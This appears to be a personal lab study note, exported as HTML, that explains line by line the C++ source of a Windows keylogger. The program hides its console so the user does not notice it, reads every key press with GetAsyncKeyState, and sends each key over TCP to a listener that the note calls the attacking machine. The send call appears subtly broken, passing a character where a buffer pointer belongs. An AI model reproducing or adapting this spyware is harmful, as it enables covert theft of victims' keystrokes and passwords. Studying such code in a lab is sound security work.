<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>client socket</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>client socket</h1><br/><h3>The c++ full code can be accessed </h3><a href="file://G:/Other computers/Yoga 520/CherryTree/screenshot/programming/C++/lab exploitation/keylogger.cpp">HERE</a><br /><br /><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#define _WINSOCK_DEPRECATED_NO_WARNINGS</span></pre></div><br />we used older functionalities of winsock utilities and we do not want the compiler to complain about this<br /><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#pragma comment(lib, &quot;Ws2_32.lib&quot;)</span></pre></div><br />tells the linker to add the &quot;Ws2_32.lib&quot; library to the list of library dependencies(remember that filenames are case-insensitive on typical Windows filesystems so &quot;ws2_32.lib&quot; is the same)<br />Some compilers, like Dev-C++  ignores #pragma directives so we have to the tell the compiler to add the Ws2_32.lib  when calling the linker on the command line with <strong>-lws2_32</strong>.<br />    We can do that on Tools→ Compiler Oprions<br />    <a href="file:///CherryTree/screenshot/programming/C++/lab exploitation/socket library.png"><img src="images/182-1.png" alt="images/182-1.png" /></a><br /><br /><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;iostream&gt;</span></pre></div><br />standard input/output utilities<br /><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;winsock2.h&gt;</span></pre></div><br /> header file  that contains most of the Winsock functions, structures, and definitions<br /><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span></pre></div><br />standard input/output utilities<br /><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span></pre></div><br />standard input/output utilities<br /><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;Windows.h&gt;</span></pre></div><br /> Windows.h header include the winuser.h header that has the function GetAsyncKeyState(Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState.)<br /> <br /> <div class="codebox"><pre><span style="color:#7f0044;font-weight:400">int</span> main()<br />{<br />	ShowWindow(GetConsoleWindow(), SW_HIDE);<br />	<br />	WSADATA WSAData;<br />	SOCKET client;<br />	SOCKADDR_IN addr;<br /><br />	WSAStartup(MAKEWORD(<span style="color:#ff0044;font-weight:400">2</span>, <span style="color:#ff0044;font-weight:400">0</span>), &amp;WSAData);<br />	client = socket(AF_INET, SOCK_STREAM, <span style="color:#ff0044;font-weight:400">0</span>);<br />	addr.sin_addr.s_addr = inet_addr(<span style="color:#3ad900;font-weight:400">&quot;172.16.160.3&quot;</span>);<br />	addr.sin_family = AF_INET;<br />	addr.sin_port = htons(<span style="color:#ff0044;font-weight:400">5555</span>);<br />	connect(client, (SOCKADDR *)&amp;addr, <span style="color:#ff9d00;font-weight:400">sizeof</span>(addr));<br /><br />		<span style="color:#ff9d00;font-weight:700">while</span> (<span style="color:#ff9d00;font-weight:700">true</span>) {<br />		Sleep(<span style="color:#ff0044;font-weight:400">10</span>);<br />		<span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> KEY = <span style="color:#ff0044;font-weight:400">0x8</span>; KEY &lt; <span style="color:#ff0044;font-weight:400">0xFF</span>; KEY++)<br />		{<br />			<span style="color:#ff9d00;font-weight:700">if</span> (GetAsyncKeyState(KEY) &amp; <span style="color:#ff0044;font-weight:400">0x8000</span>) {<br /><br />					<span style="color:#7f0044;font-weight:400">char</span> buffer;<br />					buffer = KEY;<br />					send(client, buffer, <span style="color:#ff9d00;font-weight:400">sizeof</span>(buffer), <span style="color:#ff0044;font-weight:400">0</span>);<br />			}<br />		}<br />	}<br />	closesocket(client);<br />	WSACleanup();<br />}</pre></div><br /> • <strong>ShowWindow(GetConsoleWindow(), SW_HIDE);</strong><br />   is used to hide the command window. we don&#39;t want that the user notice that the program has started<br />   If we want to show it we use: ShowWindow(::GetConsoleWindow(), SW_SHOW);<br />• <strong>WSAStartup(MAKEWORD(2, </strong><strong><span style="color:#ff0044;">0</span></strong><strong>), &amp;WSAData);</strong><br />   The WSAStartup function must be the first <strong>W</strong>indows <strong>S</strong>ockets function called by an <strong>A</strong>pplication or DLL.<br />   ◇ MAKEWORD function is used to specify the version of Winsock that we want to use( in our case 2.0), MAKEWORD is a function that create a concatenation of two 8 bit numbers(so in total 16bit),so in our case<br />       2(00000010)+0(00000000)= 0000001000000000<br />   ◇ &amp;WSAData is a pointer to the WSADATA data structure WSAData that is populated with Windows Sockets informations like the version that we have requested(2.0) and some other informations.<br />• <strong>client = socket(</strong><strong><span style="color:#00ff00;">AF_INET</span></strong><strong>, </strong><strong><span style="color:#ff8700;">SOCK_STREAM</span></strong><strong>, </strong><strong><span style="color:#ff0000;">0</span></strong><strong>);</strong><br />    This call results in a stream socket with TCP protocol providing the underlying communication<br />    the socket function → int socket(<span style="color:#00ff00;">int domain</span>, <span style="color:#ff8700;">int</span> <span style="color:#ff8700;">type</span>,<span style="color:#ff0000;"> int</span> <span style="color:#ff0000;">protocol</span>) <br />    creates a socket in the specified <span style="color:#00ff00;">domain</span> and of the specified<span style="color:#ff8700;"> type</span>. These are constants defined in sys/socket.h<br />    <span style="color:#00ff00;">domain</span>: AF_INET, AF_UNIX...<br />    <span style="color:#ff8700;">type</span>: SOCK_STREAM, SOCK_DGRAM...<br />    <span style="color:#ff0000;">protocol:</span> If the protocol is unspecified (value 0), the system selects a protocol that supports the <span style="color:#ff8700;">requested socket type</span>.<br />• <strong><span style="color:#a020f0;">sockaddr_in addr</span></strong> has this structure:<br />    <div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;netinet/in.h&gt;</span><br /><br /><span style="color:#ff9d00;font-weight:700">struct</span> sockaddr_in {<br />    <span style="color:#7f0044;font-weight:400">short</span>            sin_family;   <span style="color:#0088ff;font-weight:400">// e.g. AF_INET</span><br />    <span style="color:#7f0044;font-weight:400">unsigned</span> <span style="color:#7f0044;font-weight:400">short</span>   sin_port;     <span style="color:#0088ff;font-weight:400">// e.g. htons(5555)</span><br />    <span style="color:#ff9d00;font-weight:700">struct</span> in_addr   sin_addr;     <span style="color:#0088ff;font-weight:400">// see struct in_addr, below</span><br />    <span style="color:#7f0044;font-weight:400">char</span>             sin_zero[<span style="color:#ff0044;font-weight:400">8</span>];  <span style="color:#0088ff;font-weight:400">// zero this if you want to but not necessary</span><br />};<br /><br /><span style="color:#ff9d00;font-weight:700">struct</span> in_addr {<br />    <span style="color:#7f0044;font-weight:400">unsigned</span> <span style="color:#7f0044;font-weight:400">long</span> s_addr;  <span style="color:#0088ff;font-weight:400">// load with inet_aton()</span><br />};</pre></div><br />     ◇ <strong><span style="color:#a020f0;">addr</span></strong><strong>.sin_family = AF_INET;<br />       </strong>we match the domain used in the socket call<br />     ◇<strong> </strong><strong><span style="color:#a020f0;">addr</span></strong><strong>.sin_port</strong><br />     short integer remote port number from host byte order(usually <span style="text-decoration:underline;">Little-endian</span>=opposite of Big-endian) to network byte order(<span style="text-decoration:underline;">Big-endian</span>=most significant byte first and the least significant byte last), <br />     converted using → unsigned short htons(unsigned short a);<br />     ◇ <strong><span style="color:#a020f0;">addr</span></strong><strong>.sin_addr.s_addr = inet_addr(&quot;172.16.160.3&quot;);</strong> <br />          The inet_addr(&quot;172.16.160.3&quot;) function→ in_addr_t inet_addr(const char *cp);<br />          converts a string  into a numeric IPv4 Internet address<br />          The IPv4 that we have inserted, is the IP of the attacking machine from where we are listening<br />          Anyway now this function is deprecate because doesn&#39;t support IPv6<br />• <strong>connect(</strong><strong><span style="color:#ffa500;">client</span></strong><strong>, (SOCKADDR *)&amp;</strong><strong><span style="color:#ffff00;">addr</span></strong><strong>, sizeof(addr));</strong><br />    this call connects the socket referred to by the file descriptor <span style="color:#ffa500;text-decoration:underline;">client</span> to the address specified by <em><span style="color:#ffff00;text-decoration:underline;">addr</span></em>, <br />    <span style="color:#ffff00;text-decoration:underline;">addr</span> is been converted from SOCKADDR_IN to SOCKADDR because the function connect() <br />    accept only that → int connect(int <span style="color:#ffa500;">socket</span>, struct sockaddr *<span style="color:#ffff00;">address</span>, socklen_t address_len);<br />---------------------------------------------------------------<br /><strong><h3>from here the keylogger start to differentiate from the directory stealer:</h3></strong><br /><br />• <strong>for (int KEY = 0x8; KEY &lt; 0xFF; KEY++)<br />    </strong>The hexadecimal values between 0x8 and 0xFF are <span style="text-decoration:underline;">Virtual-Key Codes</span> used by Windows system like we can see here: <a href="https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes">https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes</a><br />    This cycle for run at at the infinite with these characters: <a href=""><img src="images/182-2.png" alt="images/182-2.png" /></a><br />• <strong>if (GetAsyncKeyState(KEY) </strong>&amp; 0x8000<strong>) </strong><br />    With &amp; we are doing a <span style="text-decoration:underline;">bitwise AND operation</span>(&amp;) and we are checking if the most significant bit is set (1000000000000000<br />    If a key is pressed the return value of GetAsyncKeyState will be 0x8001 or 0x8000 and with a <span style="text-decoration:underline;">bitwise AND operation</span>(&amp;) we will have a number !=0<br />     While we press a key the GetAsyncKeyState function can return us one of the following values:<br />      ◇ 0 in hex is 0x0000 and in binary 000000000000000<br />      ◇ -32768 in hex is 0x8000 and in binary 1000000000000000 → key is being held down<br />      ◇ 1 in hex is 0x0001 and in binary 0000000000000001 → key has just transitioned from released to pressed<br />      ◇ -32767 in hex is 0x8001 and in binary 1000000000000001 <br /><br /><br /></div>
</body>
</html>
